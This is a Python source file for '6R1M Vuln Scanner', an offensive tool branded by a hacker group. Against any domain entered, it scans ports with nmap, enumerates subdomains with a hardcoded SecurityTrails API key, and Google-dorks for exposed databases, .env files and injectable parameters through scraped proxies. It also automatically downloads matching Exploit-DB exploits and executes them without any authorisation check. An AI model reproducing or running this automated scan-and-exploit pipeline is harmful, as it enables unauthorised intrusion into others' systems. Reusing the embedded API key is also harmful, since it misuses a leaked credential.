import os 
import re
import sys
import time
import random
import pyfiglet
import requests
import platform
import pyxploitdb
import subprocess
import urllib.request
from itertools import cycle
from tabulate import tabulate
from bs4 import BeautifulSoup
from googlesearch import search
from urllib.parse import urljoin
from contextlib import redirect_stdout
from user_agent import generate_user_agent
from pystyle import Colors, Colorate, Write, Center
from whats_that_code.election import guess_language_all_methods

def install():
    if platform.system() == 'Windows':
        pass
    else:
        try:
            subprocess.run(['nmap', '--version'], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            print("[+] Nmap is installed.")
        except subprocess.CalledProcessError:
            print("[-] Nmap is not installed. Would you like to install it? (y/n): ", end="")
            user_input = input().strip().lower()
            if user_input == 'y':
                print("Installing Nmap...")
                subprocess.run(['sudo', 'apt-get', 'install', '-y', 'nmap'], check=True)
                print("[+] Nmap has been installed.")
            else:
                print("[-] Nmap installation was skipped.")


# Search & Exploit ( SnE )
def exploit(SV):
    try:
        if str(SV).find(".") == -1:
            return 
            

        exploit = pyxploitdb.searchEDB(SV, _print=False, nb_results=1)[0].link
        print(f"[+] CVE Found: {exploit}")
        
        exploit_url = exploit.replace("exploits", "raw")
        file_number = re.search(r'(\d+)$', exploit_url).group(1)
        exploit_dir = './Exploits'
        
        if not os.path.exists(exploit_dir):
            os.makedirs(exploit_dir)

        response = urllib.request.urlopen(exploit_url)
        code = str(response.read().decode('utf-8'))
  
        language = guess_language_all_methods(code)
        
        file_extension = ''
        if 'python' in language.lower():
            file_extension = '.py'
        elif 'ruby' in language.lower():
            file_extension = '.rb'
        elif 'php' in language.lower():
            file_extension = '.php'
        elif 'javascript' in language.lower():
            file_extension = '.js'
        elif 'perl' in language.lower():
            file_extension = '.pl'
        elif 'bash' in language.lower():
            file_extension = '.sh'
        elif 'java' in language.lower():
            file_extension = '.java'
        elif 'c' in language.lower():
            file_extension = '.c'
        elif 'cpp' in language.lower() or 'c++' in language.lower():
            file_extension = '.cpp'
        elif 'go' in language.lower():
            file_extension = '.go'
        elif 'swift' in language.lower():
            file_extension = '.swift'
        elif 'html' in language.lower():
            file_extension = '.html'
        elif 'css' in language.lower():
            file_extension = '.css'
        elif 'typescript' in language.lower():
            file_extension = '.ts'
        elif 'kotlin' in language.lower():
            file_extension = '.kt'
        elif 'r' in language.lower():
            file_extension = '.r'
        elif 'lua' in language.lower():
            file_extension = '.lua'
        elif 'haskell' in language.lower():
            file_extension = '.hs'
        elif 'c#' in language.lower() or 'csharp' in language.lower():
            file_extension = '.cs'
        else:
            file_extension = '.txt'
        
        print(f"[+] Downloading to {exploit_dir}")
        file_path = os.path.join(exploit_dir, f'{file_number}{file_extension}')
        with open(file_path, 'w') as file:
            file.write(code)

        print(f"[+] Exploiting ({file_path})")
        
        if file_extension == '.py':
            if platform.system() == "Windows":
                subprocess.run(['python', file_path])
            else:
                subprocess.run(['python3', file_path])
        elif file_extension == '.sh':
            subprocess.run(['bash', file_path])
        elif file_extension == '.rb':
            subprocess.run(['ruby', file_path])
        elif file_extension == '.php':
            subprocess.run(['php', file_path])
        elif file_extension == '.js':
            subprocess.run(['node', file_path])
        elif file_extension == '.pl':
            subprocess.run(['perl', file_path])
        else:
            print(f"[-] Unsupported file type: {file_extension}")

    except Exception as e:
        print(f"[-] No CVE found for {SV}")

# Port Scanner
def port_scanner(domain):
    print("[+] Scanning for open ports")
    nmap_path = r"Tools\Nmap\nmap.exe" if platform.system() == "Windows" else "nmap"
    
    command = [nmap_path, "-sV", "--open", domain]
    result = subprocess.run(command, capture_output=True, text=True)

    table_data = []
    for line in result.stdout.splitlines():
        match = re.match(r"(\d+)/(tcp|udp)\s+open\s+(\S+)\s+(.+)", line)
        if match:
            port = match.group(1)
            service = match.group(3)
            version = match.group(4)
            cleaned_version = re.sub(r'\(.*', '', version).replace("or later", "").strip()
            table_data.append([port, service, cleaned_version])

    print(tabulate(table_data, headers=["Port", "Service", "Version"], tablefmt="grid") + """\n\n____________________________________________________________________________________\n \n[Searching for CVE's]\n""")

    for _, _, cleaned_version in table_data:
        exploit(cleaned_version)

# Sub Domain List
def sublister(domain): 
    try:
        if not str(domain).startswith(('http://', 'https://')):
                website_urlr = f'https://{domain}/robots.txt'
                website_urls = f'https://{domain}/sitemap.xml'
        req = requests.get(website_urlr)



        if req.status_code == 200 or req.status_code == 304:
            print(f"[+] Robots.txt found | {website_urlr}\n")
        
        reqq = requests.get(website_urls)
        if reqq.status_code == 200 or reqq.status_code == 304:
            print(f"[+] sitemap.xml found | {website_urls}\n\n")
        
    except:
        pass
    
    print("[Subdomains]\n")
    if str(domain).startswith("http://"):
        domain = str(domain).replace("http://","")

    elif str(domain).startswith("https://"):
        domain = str(domain).replace("https://","")
    else:
        pass

    def ping_subdomain(subdomain):
        param = "-n" if platform.system().lower() == "windows" else "-c"
        command = ["ping", param, "1", subdomain]

        try:
            response = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            if response.returncode == 0:
                return True
            else:
                return False
        except Exception as e:
            print(f"Error pinging subdomain: {e}")
            return False
    url = f"https://api.securitytrails.com/v1/domain/{domain}/subdomains?children_only=false&include_inactive=true"
    headers = {
        "accept": "application/json",
        "APIKEY": "KPwCMr_BOSG68NIZLzZ_YD1fSHAWtX7Z" 
    }
    try:
        response = requests.get(url, headers=headers).json()
        
        if 'subdomains' in response:
            for sub in response['subdomains']:
                subdomain_url = f'{sub}.{domain}'
                if ping_subdomain(subdomain_url):
                    print(f'https://{sub}.{domain}')
                else:
                    pass
            print("____________________________________________________________________________________\n")
        else:
            print("No subdomains found or error in the API response.")
    except requests.exceptions.RequestException as e:
        print(f"Error fetching subdomains: {e}")

# Orginal IP Finder 
def orginIP(domain):
    def get_favicon_url(website_url):
        try:
            if not str(website_url).startswith(('http://', 'https://')):
                website_url = 'http://' + website_url
            
            response = requests.get(f"{website_url}")
            response.raise_for_status()
            soup = BeautifulSoup(response.content, 'html.parser')
            favicon_link = None
            for link in soup.find_all('link', rel=['icon', 'shortcut icon']):
                favicon_link = link.get('href')
                if favicon_link:
                    break
            if not favicon_link:
                favicon_link = urljoin(website_url, '/favicon.ico')
            return favicon_link
        except requests.exceptions.RequestException as e:
            print(f"Error fetching website data: {e}")
            return None

    domain = get_favicon_url(domain)
    if domain:
        data = requests.get(f"https://favicon-hash.kmsec.uk/api/?url={domain}").json()
        favicon_hash = data['favicon_hash']
        favicon_md5 = data['md5']
        censys = f"https://search.censys.io/search?resource=hosts&sort=RELEVANCE&per_page=25&virtual_hosts=EXCLUDE&q=services.http.response.favicons.md5_hash:{favicon_md5}"
        shodan = f'https://www.shodan.io/search?query=http.favicon.hash:{favicon_hash}'
        print(f"""
[Orgin IP] - Check These Sites
Shodan: {shodan}
Censys: {censys}
        """)

# Google Dork 
def GoogleDork(domain):
    print("[+] Google Dorking for vulnerable information.")
    user_agent = generate_user_agent()

    try:
        url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
        response = requests.get(url)

        proxy_list = ['http://' + line for line in response.text.splitlines()]
    except:
        print("[-] Couldn't get proxies.")
        proxy_list = []

    proxies = cycle(proxy_list)

    try:
        dork_list = [
            f'site:{domain} ext:sql | ext:dbf | ext:mdb | ext:accdb | ext:sq3 | ext:sqlite | ext:cdb | ext:db | ext:db3 | ext:bak | ext:ini | ext:conf | ext:cfg | ext:xml | ext:yml | ext:json | ext:properties | ext:env',
            f'site:{domain} intitle:"index of"',
            f'site:{domain} inurl:"/phpmyadmin/user_password.php"',
            f'site:{domain} intext:"Thank you for your order" +receipt',
            f'site:{domain} intext:"Thank you for your purchase" +download',
            f'site:{domain} intext:"A syntax error has occurred" filetype:ihtml',
            f'site:{domain} inurl:id=',
            f'site:{domain} inurl:productid=',
            f'site:{domain} inurl:user=',
            f'site:{domain} inurl:category=',
            f'si te:{domain} inurl:page=',
            f'site:{domain} inurl:articleid=',
            f'site:{domain} inurl:view=',
            f'site:{domain} inurl:search=',
            f'site:{domain} inurl:index=',
            f'site:{domain} inurl:eventid=',
            f'site:{domain} inurl:sessionid=',
            f'site:{domain} inurl:orderid=',
            f'site:{domain} inurl:viewprofile=',
            f'site:{domain} inurl:postid=',
            f'site:{domain} inurl:ticketid='
        ]
        
        for dork in dork_list:
            for results in search(query=dork, tld="com", lang="en", start=0, stop=None, pause=2,user_agent=user_agent):
                proxy = next(proxies)
                headers = {"User-Agent": user_agent}
                retries = 0
                while retries < 5:
                    try:
                        response = requests.get(results, headers=headers, proxies={"http": proxy})

                        if response.status_code == 429:
                            retries += 1
                            backoff_time = 2 ** retries  
                            print(f"[-] Rate limit hit. Retrying in {backoff_time} seconds...")
                            time.sleep(backoff_time)
                            continue  

                        if 200 <= response.status_code <= 302:
                            print(f"Found: {results}")
                        break 

                    except requests.exceptions.RequestException as e:
                        retries += 1
                        time_to_sleep = random.uniform(5, 10)
                        time.sleep(time_to_sleep)
                else:
                    pass

                time_to_sleep = random.uniform(10, 20)
                print(f"[+] Waiting {time_to_sleep}s to avoid rate limit.")
                time.sleep(time_to_sleep)

    except Exception as e:
        print(f"Error: {e}")




def main():
    def clear():
        if platform.system() == "Windows":
            os.system('cls')
        else:
            os.system("clear")

    if platform.system() == 'Linux' or platform.system() == 'Darwin':  # For Linux or macOS
        os.system('echo -e "\033]0;6R1M Vuln Scanner\007"')
    elif platform.system() == 'Windows':  # For Windows
        os.system('title 6R1M Vuln Scanner')

    def capture_and_display_output(domain):        
        with open(f"{domain}.txt", "w") as file:
            with redirect_stdout(sys.stdout):
                clear()
                text = domain
                current_time = time.strftime("%Y-%m-%d %H:%M:%S")
                line = "=" * 60 
                banner = pyfiglet.figlet_format(text, font="slant")

                print(f"{line}\n{banner}{line}\nTime Started: {current_time}\nDomain: {domain}\n{line}")
                #orginIP(domain)
                sublister(domain)
                port_scanner(domain)
            
            with redirect_stdout(file):
                print(f"{line}\n{banner}{line}\nTime Started: {current_time}\nDomain: {domain}\n{line}")
                #orginIP(domain)
                sublister(domain)
                port_scanner(domain)
                print("ctrl + c to close")

    install()
    clear()

    while True:
        clear()
        x = '''
                  ╔═╗  ╦═╗  ╦  ╔╦╗   
                  ║ ╦  ╠╦╝  ║  ║║║   
                  ╚═╝  ╩╚═  ╩  ╩ ╩  (v1)  
       ╚══════╦════════════════════════╦══════╝
╔═════════════╩════════════════════════╩═════════════╗
║           Welcome to 6R1M Vuln Scanner             ║
╠════════════════════════════════════════════════════╣           
║           When security is an illusion,            ║
║                we are the reality.                 ║
║                    We are 6R1M.                    ║
╚════════════════════════════════════════════════════╝     

Twitter: @W3_AR3_6R1M3Y
Discord: https://discord.gg/FJQSHcDzyw

        '''
        print(Colorate.Vertical(Colors.red_to_white, Center.XCenter(x), 1))

        domain =  Write.Input("                           Domain >>  ", Colors.red_to_white, interval=0.0025)

        if str(domain).lower() == 'exit':
            print("Exiting shell.")
            break
        
        if domain:
            capture_and_display_output(domain)
        else:
            print("No domain provided, please try again.")

main()